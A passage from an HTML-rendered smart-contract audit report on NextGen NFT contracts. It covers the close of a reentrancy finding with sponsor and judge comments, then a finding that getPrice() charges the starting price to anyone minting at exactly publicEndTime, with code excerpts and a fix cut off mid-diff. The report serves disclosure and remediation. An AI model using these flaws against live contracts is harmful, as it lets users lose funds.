tokenData[_tokenId], _mintCollectionID, _saltfun_o);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            // burn token</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            _burn(_tokenId);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            burnAmount[_burnCollectionID] = burnAmount[_burnCollectionID] + 1;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+           _mintProcessing(mintIndex, ownerOf(_tokenId), tokenData[_tokenId], _mintCollectionID, _saltfun_o);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"assessed-type-5\" style=\"position:relative;\"><a href=\"#assessed-type-5\" aria-label=\"assessed type 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Reentrancy</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1597#issuecomment-1823857801\">a2rocket (NextGen) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>The proposed mitigation is not fully corrected, as you need to store the current owner of the token before burning it and use that into <code>safeMint</code>. If you do it like itâ€™s proposed, the <code>safeMint</code> will not be able to send the token. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1597#issuecomment-1840693754\">0xsomeone (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has showcased that due to the absence of the Checks-Effects-Interactions pattern, it is possible to utilize an NFT to-be-burned (i.e. to sell it) before the actual burning operation is executed.</p>\n<p>While the recommended alleviation does not work as expected per the Sponsorâ€™s comments, the submission is valid as it can cause the recipient of an NFT (if an open sale exists) to lose their value and not acquire any NFT.</p>\n<p>I will downgrade this to a medium severity vulnerability per the judging guidelines, as the only loss-of-value is a hypothetical value <strong>of an external protocol (i.e. trading one) rather than the NextGen system</strong>. </p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1597#issuecomment-1845147371\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Wardenâ€™s submission was selected as the best due to a correct title, cleaner &#x26; concise representation throughout, and illustrative recommended mitigation.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-on-a-linear-or-exponential-descending-sale-model-a-user-that-mints-on-the-last-blocktimestamp-mints-at-an-unexpected-price\" style=\"position:relative;\"><a href=\"#m-04-on-a-linear-or-exponential-descending-sale-model-a-user-that-mints-on-the-last-blocktimestamp-mints-at-an-unexpected-price\" aria-label=\"m 04 on a linear or exponential descending sale model a user that mints on the last blocktimestamp mints at an unexpected price permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1275\">[M-04] On a Linear or Exponential Descending Sale Model, a user that mints on the last <code>block.timestamp</code> mints at an unexpected price.</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1275\">Fulum</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1622\">DeFiHackLabs</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1385\">bird-flu</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/837\">t0x1c</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/700\">Krace</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/499\">xAriextz</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1963\">merlin</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1673\">phoenixV110</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1439\">00xSEV</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1407\">nuthan2x</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1391\">zhaojie</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1001\">xuwinnie</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/990\">PENGUN</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/930\">Jorgect</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/895\">oakcobalt</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/849\">VAD37</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/822\">twcctop</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/438\">Juntao</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/395\">DanielArmstrong</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/160\">evmboi32</a></em></p>\n<p>A user can mint a token at an incorrect price and lose funds if they mint on the last authorized <code>block.timestamp</code> during a Linear or Exponential Descending Sale Model.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>On a Linear or Exponential Descending Sale Model, the admin sets the <code>collectionMintCost</code> and the <code>collectionEndMintCost</code>. In context of these sale models, the <code>collectionMintCost</code> is the price for minting a token at the beginning and the <code>collectionEndMintCost</code> the price at the end of the sale.</p>\n<p>The minting methods use the function <code>MinterContract::getPrice()</code> to compute the correct price at the actual timing, check the function with the branch for a Linear or Exponential Descending Sale Model:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//@audit If Periodic Sale</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">salesOption</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">3</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">salesOption</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allowlistStartTime</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">publicEndTime</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allowlistStartTime</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">timePeriod</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decreaserate</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">//@audit If Exponential Descending Sale</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rate</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\"> / (</span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">decreaserate</span><span class=\"mtk1\"> = ((</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\"> / (</span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">2</span><span class=\"mtk1\">))) / </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">timePeriod</span><span class=\"mtk1\">) * ((</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">timePeriod</span><span class=\"mtk1\">) - </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allowlistStartTime</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">//@audit If Linear Descending Sale</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (((</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionEndMintCost</span><span class=\"mtk1\">) / (</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">)) &gt; </span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\"> - (</span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">rate</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionEndMintCost</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">price</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">decreaserate</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionEndMintCost</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">decreaserate</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionEndMintCost</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// fixed price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>We can see that if the <code>collectionPhases[_collectionId].salesOption == 2</code> (itâ€™s the number for a descending sale model), and if the <code>block.timestamp</code> is <code>> allowlistStartTime</code> and <code>&#x3C; publicEndTime</code>. The price is correctly computed.\nA little check on the <code>mint()</code> function:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_numberOfTokens</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_maxAllowance</span><span class=\"mtk1\">, </span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_tokenData</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_mintTo</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">merkleProof</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_delegator</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_saltfun_o</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">col</span><span class=\"mtk1\">].</span><span class=\"mtk12\">publicStartTime</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">col</span><span class=\"mtk1\">].</span><span class=\"mtk12\">publicEndTime</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">              ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// fixed price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">collectionMintCost</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>But if the <code>publicEndTime</code> is strictly equal to <code>publicEndTime</code>, the returned price is the <code>collectionMintCost</code> instead of <code>collectionEndMintCost</code> because the logic go to the â€œelseâ€ branch. Itâ€™s an incorrect price because itâ€™s the price at the beginning of the collection. As you can see on <code>mint()</code>, a user can mint a token on the <code>block.timestamp</code> <code>publicEndTime</code>.</p>\n<p>Users that mint on the last <code>block.timstamp</code> mint at an unexpected price and for all the minting methods which use the <code>getPrice()</code> function.</p>\n<h3 id=\"logs\" style=\"position:relative;\"><a href=\"#logs\" aria-label=\"logs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Logs</h3>\n<p>You can see the logs of the test with this image:</p>\n<p><img src=\"https://i.goopics.net/5kayuu.png\" alt=\"Image\"></p>\n<p>Hereâ€™s the <a href=\"https://gist.github.com/AxelAramburu/c10597b5ff60616b8a15d091f88de8da\">gist</a> if you want to execute the PoC directly.\nYou can execute the test with this command:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test --mt testgetWrongPriceAtEnd -vvv (or with -vvvvv to see all the transaction logs)</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-7\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-7\" aria-label=\"recommended mitigation steps 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change the <code>&#x3C; &#x26; ></code> to <code>&#x3C;= &#x26; =></code> on the <code>else/if</code> branch inside the <code>getPrice()</code> function.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getPrice</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tDiff</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//@audit-info If Periodic Sale</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">salesOption</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">3</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ...</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        -- } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">salesOption</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">allowlistStartTime</span><span class=\"mtk1\"> &amp;&amp; -- </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">publicEndTime</span><span class=\"mtk1\">){</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ++ } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collectionPhases</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">salesOption</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">2</span><span class=\"mtk1\"> &amp;&amp; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span 